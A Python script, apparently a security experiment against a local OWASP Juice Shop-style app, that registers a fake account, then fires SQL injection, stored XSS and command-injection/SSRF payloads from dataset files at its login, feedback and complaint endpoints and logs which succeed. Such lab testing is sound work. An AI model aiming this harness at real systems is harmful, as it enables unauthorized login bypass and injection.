import requests
import csv
import time
import os
import random

BASE_URL = "http://localhost:3000"
REPORT_FILE = "bao_cao_dinh_luong_loi.csv"

def load_dataset_all(file_path):
    if not os.path.exists(file_path):
        print(f"❌ Không tìm thấy file: {file_path}")
        return []
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

print("--- ĐANG NẠP TOÀN BỘ BIG DATASET VÀO BỘ NHỚ ---")
sqli_payloads = load_dataset_all(os.path.join("datasets", "dataset_sqli.txt"))
xss_payloads = load_dataset_all(os.path.join("datasets", "dataset_xss.txt"))
system_payloads = load_dataset_all(os.path.join("datasets", "dataset_system.txt"))

print(f"✔ Tổng quy mô giả lập: {len(sqli_payloads) + len(xss_payloads) + len(system_payloads)} Requests!")
# 2. Khởi tạo Session để tối ưu tốc độ và giữ trạng thái kết nối
session = requests.Session()

# =========================================================================
# LUỒNG XÁC THỰC TỰ ĐỘNG (AUTOMATED IDENTITY PROVISIONING)
# =========================================================================
print("\n[🔑] Khởi tạo luồng cấp quyền tự động (Tạo account ngẫu nhiên)...")
rand_id = random.randint(10000, 99999)
fake_email = f"abc_{rand_id}@gmail.com"
fake_password = "SecureSimulation2026!"

REGISTER_URL = f"{BASE_URL}/api/Users"
LOGIN_URL = f"{BASE_URL}/rest/user/login"
token = None

register_data = {
    "email": fake_email,
    "password": fake_password,
    "passwordRepeat": fake_password,
    "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
    "securityAnswer": "Anonymous"
}

try:
    reg_res = session.post(REGISTER_URL, json=register_data, timeout=5)
    if reg_res.status_code == 201:
        print(f" -> [Đăng ký] Tạo thành công User định danh: {fake_email}")
        login_data = {"email": fake_email, "password": fake_password, "captchaId": 0, "captcha": "0"}
        login_res = session.post(LOGIN_URL, json=login_data, timeout=5)
        
        if login_res.status_code == 200:
            token = login_res.json().get('authentication', {}).get('token')
            print(" -> [Xác thực] Lấy Token thành công. Đã nhúng vào Session Headers.")
            session.headers.update({"Authorization": f"Bearer {token}"})
        else:
            print(f"❌ Đăng nhập thất bại (HTTP {login_res.status_code})")
    else:
        print(f"❌ Đăng ký thất bại (HTTP {reg_res.status_code})")
except Exception as e:
    print(f"❌ Lỗi thiết lập tài khoản tự động: {e}")


with open(REPORT_FILE, mode='w', newline='', encoding='utf_8_sig') as csv_file:
    writer = csv.writer(csv_file)
    writer.writerow(["Mã KB", "Loại Tấn Công", "Payload", "HTTP Status", "Thời Gian (s)", "Kết Quả Thực Nghiệm"])

    # --- KB_01: SQL Injection ---
    print(f"\n[⚡] Chạy Kịch bản 1: SQLi (Target: {len(sqli_payloads)} requests)...")
    for idx, payload in enumerate(sqli_payloads, 1):
        payload_data = {"email": payload, "password": "pass", "captchaId": 0, "captcha": "0"}
        start = time.time()
        try:
            # Gửi request không dùng token (để test khả năng bypass login)
            response = session.post(LOGIN_URL, json=payload_data, headers={"Authorization": ""}, timeout=3)
            res_time = round(time.time() - start, 4)
            status = response.status_code
            res_text = response.text if response.text else ""
            
            if status == 200 and "token" in res_text:
                result = "THÀNH CÔNG: Chiếm quyền User thành công"
            elif status == 500:
                if "SQLITE_ERROR" in res_text or "sqlite" in res_text.lower():
                    result = "Gây lỗi Server (HTTP 500) - Rò rỉ cấu trúc SQLite"
                else:
                    result = "Gây lỗi Server (HTTP 500) - Crash hệ thống"
            else:
                result = "Thất bại (Bị chặn/Sai định dạng dữ liệu)"
        except Exception:
            status, res_time, result = "TIMEOUT", round(time.time() - start, 4), "Mất kết nối vật lý"
        
        # Bảo vệ chuỗi chống lỗi gãy hàng CSV bằng cách ép kiểu chuỗi sạch
        writer.writerow(["KB_01", "SQL Injection", str(payload), status, res_time, result])
        time.sleep(0.002) 
        if idx % 250 == 0: print(f" -> Tiến độ SQLi: {idx}/{len(sqli_payloads)}...")

    # --- KB_02: XSS ---
    print(f"\n[⚡] Chạy Kịch bản 2: XSS (Target: {len(xss_payloads)} requests)...")
    FEEDBACK_URL = f"{BASE_URL}/api/Feedbacks"
    for idx, payload in enumerate(xss_payloads, 1):
        feedback_data = {"comment": payload, "rating": 5}
        start = time.time()
        try:
            response = session.post(FEEDBACK_URL, json=feedback_data, timeout=3)
            res_time = round(time.time() - start, 4)
            status = response.status_code
            
            if status == 201:
                result = "THÀNH CÔNG: Mã độc được lưu nguyên bản vào DB (Stored XSS)"
            elif status == 500:
                result = "Bị chặn bởi bộ lọc Validation (HTTP 500)"
            else:
                result = f"Mã lỗi khác (HTTP {status})"
        except Exception:
            status, res_time, result = "TIMEOUT", round(time.time() - start, 4), "Mất kết nối vật lý"
            
        writer.writerow(["KB_02", "XSS", str(payload), status, res_time, result])
        time.sleep(0.002)
        if idx % 250 == 0: print(f" -> Tiến độ XSS: {idx}/{len(xss_payloads)}...")

    # --- KB_03: Command Injection & SSRF ---
    print(f"\n[⚡] Chạy Kịch bản 3: System Attacks (Target: {len(system_payloads)} requests)...")
    COMPLAINT_URL = f"{BASE_URL}/api/Complaints"
    for idx, payload in enumerate(system_payloads, 1):
        complaint_data = {"message": "Bad tasted juice", "fileUrl": payload}
        start = time.time()
        try:
            # Gửi kèm token tự động đã lưu trong session ở trên
            response = session.post(COMPLAINT_URL, json=complaint_data, timeout=3)
            res_time = round(time.time() - start, 4)
            status = response.status_code
            
            if status in [200, 201]:
                result = "THÀNH CÔNG: Vượt qua bộ lọc, đẩy lệnh vào luồng xử lý OS"
            elif status == 401:
                result = "Thất bại: Token hết hạn hoặc không có hiệu lực"
            else:
                result = f"Bị hệ thống từ chối (HTTP {status})"
        except Exception:
            status, res_time, result = "TIMEOUT", round(time.time() - start, 4), "Mất kết nối vật lý"
            
        writer.writerow(["KB_03", "Command / SSRF", str(payload), status, res_time, result])
        time.sleep(0.002)
        if idx % 250 == 0: print(f" -> Tiến độ System: {idx}/{len(system_payloads)}...")

print(f"\n HOÀN THÀNH! File kết quả định lượng {len(sqli_payloads) + len(xss_payloads) + len(system_payloads)} mẫu đã được cấu trúc tại: {REPORT_FILE}")
